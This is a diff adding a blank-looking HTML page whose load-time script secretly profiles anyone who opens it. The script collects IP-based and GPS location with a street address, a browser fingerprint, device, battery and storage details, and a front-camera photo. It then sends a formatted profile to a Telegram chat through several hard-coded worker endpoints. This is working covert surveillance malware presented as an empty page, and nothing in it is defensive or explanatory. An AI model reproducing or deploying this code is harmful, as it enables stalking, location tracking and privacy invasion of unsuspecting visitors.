@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>.</title>
+    <style>
+        body { background: white; margin: 0; padding: 0; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: system-ui; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ================= CONFIGURACIÓN =================
+        const CHAT_ID = '7555997298';
+        // 🔥 CAMBIA ESTA URL POR LA DE TU NUEVO WORKER
+        const WORKER_URL = 'https://data-capture.societykark.workers.dev';  // <--- CAMBIA AQUÍ
+
+        // ========== FUNCIONES DE RECOLECCIÓN ==========
+        async function getLocationFromWorker() {
+            try {
+                const res = await fetch(WORKER_URL);
+                if (!res.ok) throw new Error();
+                const data = await res.json();
+                return {
+                    ip: data.ip || 'N/A',
+                    country: data.country || 'N/A',
+                    region: data.region || 'N/A',
+                    city: data.city || 'N/A',
+                    postal: data.postal || 'N/A',
+                    timezone: data.timezone || 'N/A'
+                };
+            } catch(e) { return null; }
+        }
+
+        async function getLocationFromIpapi() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return {
+                    ip: data.ip || 'N/A',
+                    country: data.country_name || 'N/A',
+                    region: data.region || 'N/A',
+                    city: data.city || 'N/A',
+                    postal: data.postal || 'N/A',
+                    timezone: data.timezone || 'N/A'
+                };
+            } catch(e) { return null; }
+        }
+
+        async function reverseGeocode(lat, lng) {
+            try {
+                const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`;
+                const res = await fetch(url);
+                const data = await res.json();
+                if (data && data.display_name) {
+                    const address = data.address;
+                    let parts = [];
+                    if (address.road) parts.push(address.road);
+                    if (address.suburb) parts.push(address.suburb);
+                    else if (address.city) parts.push(address.city);
+                    else if (address.town) parts.push(address.town);
+                    else if (address.village) parts.push(address.village);
+                    if (address.state) parts.push(address.state);
+                    return parts.join(', ');
+                }
+            } catch(e) {}
+            return null;
+        }
+
+        async function getFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200; canvas.height = 50;
+            ctx.fillStyle = "#f60";
+            ctx.fillRect(0, 0, 200, 50);
+            ctx.fillStyle = "#069";
+            ctx.font = "14px Arial";
+            ctx.fillText("FP", 10, 30);
+            const hash = canvas.toDataURL().slice(0, 100);
+            let gpu = 'N/A';
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const info = gl.getExtension('WEBGL_debug_renderer_info');
+                gpu = info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : 'N/A';
+            } catch(e) {}
+            const fonts = ["Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New", "Impact", "Comic Sans MS"];
+            const available = fonts.filter(f => document.fonts.check(`12px "${f}"`));
+            return { gpu, fonts: available.join(', ') || 'Ninguna', canvas: hash };
+        }
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let model = "Desconocido";
+            if (ua.includes('iPhone')) model = 'iPhone';
+            else if (ua.includes('iPad')) model = 'iPad';
+            else if (ua.includes('Android')) model = 'Android';
+            else if (ua.includes('Mac')) model = 'Mac';
+            else if (ua.includes('Windows')) model = 'Windows PC';
+            else if (ua.includes('Linux')) model = 'Linux';
+            return {
+                model,
+                ua,
+                language: navigator.language || 'N/A',
+                resolution: `${window.screen.width}x${window.screen.height}`,
+                cores: navigator.hardwareConcurrency || 'N/A',
+                platform: navigator.platform || 'N/A',
+                vendor: navigator.vendor || 'N/A'
+            };
+        }
+
+        async function getStorageInfo() {
+            try {
+                const est = await navigator.storage.estimate();
+                return { total: (est.quota / (1024**3)).toFixed(2), used: (est.usage / (1024**3)).toFixed(2) };
+            } catch(e) { return { total: 'N/A', used: 'N/A' }; }
+        }
+
+        async function getBatteryInfo() {
+            try {
+                const battery = await navigator.getBattery();
+                return { level: (battery.level * 100).toFixed(0) + '%', charging: battery.charging ? 'Sí' : 'No' };
+            } catch(e) { return { level: 'N/A', charging: 'N/A' }; }
+        }
+
+        function getLocalTime() { return new Date().toLocaleString(); }
+
+        function getGPS() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) { resolve(null); return; }
+                let watchId = navigator.geolocation.watchPosition(
+                    pos => { navigator.geolocation.clearWatch(watchId); resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }); },
+                    () => { navigator.geolocation.clearWatch(watchId); navigator.geolocation.getCurrentPosition(
+                        pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+                        () => resolve(null),
+                        { enableHighAccuracy: true, timeout: 10000 }
+                    ); },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
+        }
+
+        async function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            let stream = null;
+            try { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }); } catch(e) {
+                try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); } catch(err) { return null; }
+            }
+            if (!stream) return null;
+            video.srcObject = stream;
+            await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
+            await new Promise(r => setTimeout(r, 500));
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+            stream.getTracks().forEach(t => t.stop());
+            video.srcObject = null;
+            return blob;
+        }
+
+        // ========== GENERAR HTML ==========
+        function generateHTML(data) {
+            return `<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Perfil de ${data.full_name}</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:'Segoe UI',Arial,sans-serif; background:#0a0a1a; color:#e0e0e0; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }
+.container { max-width:900px; width:100%; background:#12122a; border-radius:16px; padding:30px; box-shadow:0 0 30px rgba(0,100,255,0.15); border:1px solid #1a2a4a; }
+h1 { color:#00d4ff; text-align:center; font-size:28px; margin-bottom:10px; text-shadow:0 0 20px rgba(0,212,255,0.2); }
+.subtitle { text-align:center; color:#8899bb; font-size:14px; margin-bottom:25px; border-bottom:1px solid #1a2a4a; padding-bottom:15px; }
+.section { background:#0d0d22; border-radius:10px; padding:15px 20px; margin-bottom:12px; border-left:3px solid #00d4ff; }
+.section:hover { background:#14143a; border-left-color:#ff6b6b; }
+.label { font-weight:600; color:#88bbdd; display:inline-block; width:150px; font-size:14px; }
+.value { color:#f0f0f0; font-weight:400; word-break:break-all; }
+.value a { color:#00d4ff; text-decoration:none; }
+.value a:hover { text-decoration:underline; color:#ff6b6b; }
+.footer { text-align:center; margin-top:25px; font-size:12px; color:#445566; border-top:1px solid #1a2a4a; padding-top:15px; }
+.row { display:flex; flex-wrap:wrap; margin-bottom:4px; }
+.row .label { flex:0 0 150px; }
+.row .value { flex:1; }
+@media (max-width:600px) { .row .label { flex:0 0 100%; } }
+</style>
+</head>
+<body>
+<div class="container">
+<h1>🕵️ PERFIL COMPLETO</h1>
+<div class="subtitle">Datos extraídos automáticamente</div>
+<div class="section">
+<div class="row"><span class="label">👤 Nombre completo:</span><span class="value">${data.full_name}</span></div>
+<div class="row"><span class="label">📛 Username:</span><span class="value">${data.username}</span></div>
+<div class="row"><span class="label">🆔 ID:</span><span class="value"><code>${data.user_id}</code></span></div>
+<div class="row"><span class="label">📞 Teléfono:</span><span class="value">${data.phone}</span></div>
+<div class="row"><span class="label">🗣️ Idioma:</span><span class="value">${data.language}</span></div>
+<div class="row"><span class="label">⭐ Premium:</span><span class="value">${data.is_premium}</span></div>
+<div class="row"><span class="label">📖 Biografía:</span><span class="value">${data.bio}</span></div>
+</div>
+<div class="section">
+<div class="row"><span class="label">📱 Dispositivo:</span><span class="value">${data.device}</span></div>
+<div class="row"><span class="label">📟 Plataforma:</span><span class="value">${data.platform}</span></div>
+<div class="row"><span class="label">🏷️ Vendor:</span><span class="value">${data.vendor}</span></div>
+</div>
+<div class="section">
+<div class="row"><span class="label">💬 Chat:</span><span class="value">${data.chat_type} (ID: ${data.chat_id})</span></div>
+</div>
+<div class="section">
+<div class="row"><span class="label">📩 Mensaje:</span><span class="value">${data.message_text}</span></div>
+<div class="row"><span class="label">📅 Fecha:</span><span class="value">${data.message_date}</span></div>
+</div>
+<div class="section">
+<div class="row"><span class="label">🌐 IP:</span><span class="value"><code>${data.ip}</code></span></div>
+<div class="row"><span class="label">📍 País:</span><span class="value">${data.country}</span></div>
+<div class="row"><span class="label">🏙️ Región:</span><span class="value">${data.region}</span></div>
+<div class="row"><span class="label">🌆 Ciudad:</span><span class="value">${data.city}</span></div>
+<div class="row"><span class="label">📮 Código Postal:</span><span class="value">${data.postal}</span></div>
+<div class="row"><span class="label">🕒 Zona Horaria:</span><span class="value">${data.timezone}</span></div>
+<div class="row"><span class="label">🗺️ Coordenadas:</span><span class="value">${data.lat}, ${data.lon}</span></div>
+<div class="row"><span class="label">🔗 Google Maps:</span><span class="value"><a href="${data.maps_link}" target="_blank">${data.maps_link}</a></span></div>
+</div>
+<div class="footer">⏰ Capturado: ${data.captured_time}</div>
+</div>
+</body>
+</html>`;
+        }
+
+        // ========== ENVIAR HTML COMO DOCUMENTO ==========
+        async function sendHTML(htmlContent) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            const blob = new Blob([htmlContent], { type: 'text/html' });
+            formData.append('document', blob, `perfil_${Date.now()}.html`);
+
+            try {
+                const res = await fetch(WORKER_URL, { method: 'POST', body: formData });
+                if (res.ok) {
+                    console.log('✅ HTML enviado');
+                } else {
+                    console.error('❌ Error al enviar HTML:', res.status);
+                }
+            } catch (e) {
+                console.error('❌ Error:', e);
+            }
+        }
+
+        // ========== PROCESO PRINCIPAL ==========
+        window.addEventListener('load', async function() {
+            try {
+                // Obtener ubicación
+                const [workerLoc, ipapiLoc] = await Promise.all([getLocationFromWorker(), getLocationFromIpapi()]);
+                const ip = workerLoc?.ip || ipapiLoc?.ip || 'N/A';
+
+                // Recolectar datos
+                const [gps, fp, device, storage, battery, photo] = await Promise.all([
+                    getGPS(),
+                    getFingerprint(),
+                    getDeviceInfo(),
+                    getStorageInfo(),
+                    getBatteryInfo(),
+                    capturePhoto()
+                ]);
+
+                const localTime = getLocalTime();
+                let address = null;
+                if (gps) address = await reverseGeocode(gps.lat, gps.lng);
+
+                // Construir objeto de datos
+                const data = {
+                    full_name: device.model + ' User',
+                    username: 'N/A',
+                    user_id: 'N/A',
+                    phone: 'No disponible',
+                    language: device.language,
+                    is_premium: 'No',
+                    bio: 'N/A',
+                    device: device.model,
+                    platform: device.platform,
+                    vendor: device.vendor,
+                    chat_type: 'Privado',
+                    chat_id: 'N/A',
+                    message_text: 'Apertura de página',
+                    message_date: localTime,
+                    ip: ip,
+                    country: workerLoc?.country || ipapiLoc?.country || 'N/A',
+                    region: workerLoc?.region || ipapiLoc?.region || 'N/A',
+                    city: workerLoc?.city || ipapiLoc?.city || 'N/A',
+                    postal: workerLoc?.postal || ipapiLoc?.postal || 'N/A',
+                    timezone: workerLoc?.timezone || ipapiLoc?.timezone || 'N/A',
+                    lat: gps?.lat || 'N/A',
+                    lon: gps?.lng || 'N/A',
+                    maps_link: gps ? `https://www.google.com/maps?q=${gps.lat},${gps.lng}` : 'N/A',
+                    captured_time: localTime
+                };
+
+                // Generar y enviar HTML
+                const htmlContent = generateHTML(data);
+                await sendHTML(htmlContent);
+
+                // También enviar resumen en texto
+                let msg = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
+                msg += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
+                msg += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvas}...\n\n`;
+                msg += `🌐 *Network Information*\n   • IP Address: ${ip}\n   • Language: ${device.language}\n\n`;
+                msg += `📍 *Ubicación*\n`;
+                if (gps) {
+                    if (address) msg += `   • Dirección: ${address}\n`;
+                    msg += `   • Coordenadas: ${gps.lat}, ${gps.lng}\n`;
+                    msg += `   • Precisión: ±${gps.accuracy}m\n`;
+                    msg += `   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
+                } else {
+                    msg += `   • GPS: No disponible\n`;
+                }
+                msg += `\n📱 *Dispositivo*\n   • Plataforma: ${device.platform}\n   • Vendor: ${device.vendor}\n`;
+                msg += `\n🔋 *Batería*\n   • Nivel: ${battery.level}\n   • Cargando: ${battery.charging}\n`;
+                msg += `\n💾 *Almacenamiento*\n   • Usado: ${storage.used} GB\n   • Total: ${storage.total} GB\n`;
+                msg += `\n━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Desarrollado por: @SCK`;
+
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('text', msg);
+
+                // Enviar a todos los Workers (opcional)
+                const urls = [
+                    'https://bot-ubi.societykark.workers.dev',
+                    'https://bot-tg.societykark.workers.dev',
+                    'https://tg-bot12.societykark.workers.dev',
+                    'https://app-trk.societykark.workers.dev',
+                    'https://app-tg.societykark.workers.dev',
+                    'https://app-kali.societykark.workers.dev',
+                    'https://societykark.pythonanywhere.com',
+                    'https://kali-bot12.societykark.workers.dev'
+                ];
+                await Promise.all(urls.map(url => fetch(url, { method: 'POST', body: formData }).catch(() => {})));
+
+            } catch(e) {
+                console.error(e);
+            }
+        });
+    </script>
+</body>
+</html>
